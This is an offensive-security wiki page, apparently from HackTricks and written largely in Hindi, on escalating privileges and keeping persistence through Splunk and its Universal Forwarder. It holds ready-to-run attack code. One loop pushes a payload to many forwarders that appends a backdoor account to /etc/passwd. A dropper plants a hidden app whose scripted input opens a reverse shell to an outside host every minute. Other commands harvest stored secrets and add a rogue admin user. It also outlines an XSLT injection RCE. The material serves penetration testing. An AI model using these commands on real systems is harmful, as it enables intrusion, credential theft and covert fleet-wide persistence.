# Splunk LPE and Persistence

{{#include ../../banners/hacktricks-training.md}}

यदि **internally** या **externally** किसी machine को **enumerating** करते समय आपको **Splunk running** मिलता है (आमतौर पर web UI के लिए **8000** और management API के लिए **8089**), तो valid credentials को अक्सर app installation, scripted inputs या management actions के माध्यम से **code execution** में बदला जा सकता है।<sup>[[1]](#references)[[5]](#references)[[6]](#references)[[10]](#references)</sup> यदि Splunk **root** के रूप में चल रहा है, तो यह अक्सर तुरंत **privilege escalation** में बदल जाता है।<sup>[[1]](#references)</sup>

यदि आपको केवल generic remote attack surface, enumeration या app-upload RCE path चाहिए, तो देखें:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

यदि आप **already root** हैं और Splunk service केवल localhost पर listening नहीं कर रही है, तो आप **Splunk password hashes** भी चुरा सकते हैं, **encrypted secrets** recover कर सकते हैं, या locally अथवा कई forwarders में persistence बनाए रखने के लिए एक **malicious app** push कर सकते हैं।<sup>[[7]](#references)[[8]](#references)[[11]](#references)</sup>

## Interesting Local Files

जब आप Splunk या Splunk Universal Forwarder चलाने वाले host पर पहुँचते हैं, तो ये paths आमतौर पर सबसे interesting होते हैं:<sup>[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
महत्वपूर्ण artifacts:

- **`$SPLUNK_HOME/etc/passwd`**: local Splunk users और password hashes।<sup>[[7]](#references)</sup>
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: कई `.conf` files में stored secrets को encrypt करने के लिए Splunk द्वारा उपयोग की जाने वाली key।<sup>[[8]](#references)</sup>
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: initial admin bootstrap file; gold images और provisioning mistakes में उपयोगी। यदि `etc/passwd` पहले से मौजूद हो, तो इसे ignore कर दिया जाता है।<sup>[[9]](#references)</sup>
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: scripted inputs आमतौर पर यहीं enabled होते हैं।<sup>[[10]](#references)</sup>
- **`$SPLUNK_HOME/etc/deployment-apps/`** या **`$SPLUNK_HOME/etc/apps/`**: persistent app छिपाने या पहले से distribute की जा रही चीज़ों की समीक्षा करने के लिए अच्छे स्थान।<sup>[[11]](#references)</sup>

## Splunk Universal Forwarder Agent Exploit Summary

अधिक जानकारी के लिए [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) देखें। यह केवल एक summary है।<sup>[[1]](#references)</sup>

**Exploit overview:**
Splunk Universal Forwarder (UF) को target करने वाला exploit उन attackers को, जिनके पास **agent password** है, agent चलाने वाले systems पर arbitrary code execute करने की अनुमति देता है और environment के बड़े हिस्से को compromise कर सकता है।<sup>[[1]](#references)</sup>

**Why it works:**

- UF management service आमतौर पर **TCP 8089** पर exposed होती है।<sup>[[6]](#references)</sup>
- Attackers API से authenticate करके forwarder को **malicious app bundle** install करने का निर्देश दे सकते हैं।<sup>[[1]](#references)[[5]](#references)</sup>
- इसी primitive का उपयोग locally **LPE** या remotely **RCE** के लिए किया जा सकता है।<sup>[[5]](#references)</sup>
- **SplunkWhisperer2** जैसे public tooling app bundle को automatically create कर सकते हैं और Linux targets के लिए payloads adapt कर सकते हैं।<sup>[[5]](#references)</sup>

**Common ways to recover the password:**

- Documentation, scripts, shares या deployment automation में cleartext credentials।<sup>[[1]](#references)</sup>
- `$SPLUNK_HOME/etc/passwd` के अंदर password hashes, जिनके बाद offline cracking की जाती है।<sup>[[1]](#references)[[7]](#references)</sup>
- `user-seed.conf` जैसी golden images या provisioning leftovers।<sup>[[1]](#references)[[9]](#references)</sup>

**Impact:**

- प्रत्येक compromised host पर SYSTEM/root-level code execution।<sup>[[1]](#references)</sup>
- Persistent apps, backdoors या ransomware की deployment।<sup>[[1]](#references)</sup>
- Data forward किए जाने से पहले telemetry को disable या tamper करना।<sup>[[1]](#references)</sup>

**Example command for exploitation:**

Original report multiple forwarders को payload भेजने के लिए निम्न loop को demonstrate करती है।<sup>[[1]](#references)</sup>
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**उपयोग योग्य public exploits:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Scripted Inputs या Malicious Apps के माध्यम से Persistence

यदि आपके पास `root`/`splunk` के रूप में **filesystem write access** या apps install करने के लिए authenticated access है, तो **scripted input** वाला एक **custom app** डालना बहुत विश्वसनीय persistence mechanism है।<sup>[[2]](#references)[[5]](#references)[[10]](#references)</sup> Splunk के अपने documentation के अनुसार scripted inputs app directory के अंदर होने चाहिए और `inputs.conf` से enabled होने चाहिए।<sup>[[10]](#references)</sup>

सामान्य layout:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
न्यूनतम `inputs.conf`:<sup>[[10]](#references)</sup>
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
त्वरित Linux dropper (उस documented app layout का उपयोग करके):<sup>[[10]](#references)</sup>
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
नोट्स:

- यही trick **Universal Forwarder** पर भी `/opt/splunkforwarder/etc/apps/` का उपयोग करके काम करती है।<sup>[[2]](#references)[[10]](#references)</sup>
- Attackers अक्सर स्पष्ट रूप से malicious app बनाने के बजाय किसी legitimate add-on को modify करके खुद को छिपा लेते हैं।<sup>[[2]](#references)</sup>
- **deployment server** पर `deployment-apps/` के अंदर malicious app रखना **fleet-wide persistence** में बदल जाता है, क्योंकि forwarders updated apps के लिए poll करते हैं, उन्हें download करते हैं और लागू करने के लिए अक्सर restart होते हैं।<sup>[[11]](#references)[[12]](#references)</sup>

## Credential Theft और Admin Takeover

यदि आप Splunk की local files पढ़ सकते हैं, तो आमतौर पर दो अच्छे लक्ष्य होते हैं: **Splunk admin access** प्राप्त करना और **encrypted service credentials** प्राप्त करना।<sup>[[8]](#references)</sup>

### Password hashes और local users

Splunk local authentication data को `etc/passwd` में store करता है। Deployment के आधार पर, उस file को crack करने से web UI और management API के लिए काम करने वाले credentials प्राप्त किए जा सकते हैं।<sup>[[1]](#references)[[7]](#references)</sup>

यदि आपके पास पहले से valid **admin** credentials हैं और Splunk अपने **native** authentication backend का उपयोग करता है, तो CLI का उपयोग स्वयं persistence के लिए किया जा सकता है।<sup>[[13]](#references)</sup>
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` और encrypted values

Splunk कई configuration files में stored sensitive values को protect करने के लिए `etc/auth/splunk.secret` का उपयोग करता है। यदि आप **secret** और संबंधित **`.conf` files** दोनों चुरा सकते हैं, तो अक्सर निम्नलिखित को recover या replay कर सकते हैं:<sup>[[8]](#references)</sup>

- `pass4SymmKey` जैसे forwarder/indexer shared secrets
- `sslPassword` जैसे TLS private-key passwords
- `bindDNPassword` जैसे LDAP bind credentials

यह **lateral movement** में सहायक हो सकता है, भले ही Splunk admin password स्वयं crackable न हो।<sup>[[8]](#references)</sup>

### `user-seed.conf` abuse

`user-seed.conf` का उपयोग केवल first start के दौरान या तब होता है जब `etc/passwd` मौजूद न हो। इसलिए live box पर यह कम उपयोगी है, लेकिन निम्नलिखित में काफी interesting है:<sup>[[9]](#references)</sup>

- compromised installation templates
- container images
- unattended provisioning workflows
- ऐसे appliances जहां Splunk अपने-आप reinitialized होता है

इन मामलों में `splunk hash-passwd` से generated `HASHED_PASSWORD` डालने से redeployment के बाद admin access वापस पाने का एक quiet तरीका मिल जाता है।<sup>[[9]](#references)</sup>

## Abusing Splunk Queries

अधिक जानकारी के लिए [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis) देखें।<sup>[[3]](#references)[[4]](#references)</sup>

एक उपयोगी recent technique vulnerable Splunk Enterprise versions में **user-supplied XSLT** का abuse करके low-privileged authenticated account को `splunk` user के रूप में **OS command execution** में बदलना है।<sup>[[3]](#references)[[4]](#references)</sup>

High-level flow:<sup>[[3]](#references)[[4]](#references)</sup>

1. Splunk में authenticate करें।
2. preview/upload functionality के माध्यम से एक malicious **XSL** file upload करें।
3. Splunk को **dispatch** directory से uploaded stylesheet के साथ search results render करने के लिए तैयार करें।
4. File लिखने या Splunk के search pipeline के माध्यम से execution trigger करने के लिए XSLT payload का उपयोग करें (उदाहरण के लिए `runshellscript` जैसी internal functionality तक पहुंचकर)।

महत्वपूर्ण offensive takeaway यह है कि यह path **app upload** की आवश्यकता के बिना **post-auth RCE** प्रदान करता है। Linux पर आमतौर पर आपको **`splunk`** account मिलता है, जो फिर भी valuable है क्योंकि उस user के पास अक्सर application tree का ownership होता है, वह secrets पढ़ सकता है और shell loss के बाद भी survive करने वाले persistent apps plant कर सकता है।<sup>[[3]](#references)[[4]](#references)</sup>

Exploitation के दौरान उपयोग किया जाने वाला एक representative path है:<sup>[[4]](#references)</sup>
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
यदि Splunk बहुत अधिक privileges के साथ चल रहा है, या `splunk` user के पास dangerous scripts, writable service units, या गलत `sudo` rules का access है, तो यह एक साफ़ **LPE** chain बन जाती है।

## References

- [1] [RCE और Persistence के लिए Splunk Forwarders का दुरुपयोग](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [TraitorWare से सावधान: Persistence के लिए Splunk का उपयोग](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Splunk Security Advisory SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [CVE-2023-46214 Analysis: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)
- [5] [SplunkWhisperer2/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [6] [Default values बदलें](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.2/start-splunk-enterprise-and-perform-initial-tasks/change-default-values)
- [7] [authentication.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.4/configuration-file-reference/10.4.0-configuration-file-reference/authentication.conf)
- [8] [कई servers पर secure passwords deploy करें](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/10.4/install-splunk-enterprise-securely/deploy-secure-passwords-across-multiple-servers)
- [9] [user-seed.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.2/configuration-file-reference/9.2.6-configuration-file-reference/user-seed.conf)
- [10] [Scripted input सेट अप करना](https://help.splunk.com/en/splunk-enterprise/developing-views-and-apps-for-splunk-web/10.0/build-scripted-inputs/setting-up-a-scripted-input)
- [11] [Deployment apps बनाएं](https://help.splunk.com/splunk-enterprise/administer/update-your-deployment/9.4/configure-the-deployment-system/create-deployment-apps)
- [12] [Deployment updates कैसे होते हैं](https://help.splunk.com/en/splunk-enterprise/administer/update-your-deployment/9.2/deployment-server-and-forwarder-management/how-deployment-updates-happen)
- [13] [CLI के साथ users configure करें](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/9.4/perform-advanced-user-and-role-management-in-splunk-enterprise/configure-users-with-the-cli)
{{#include ../../banners/hacktricks-training.md}}
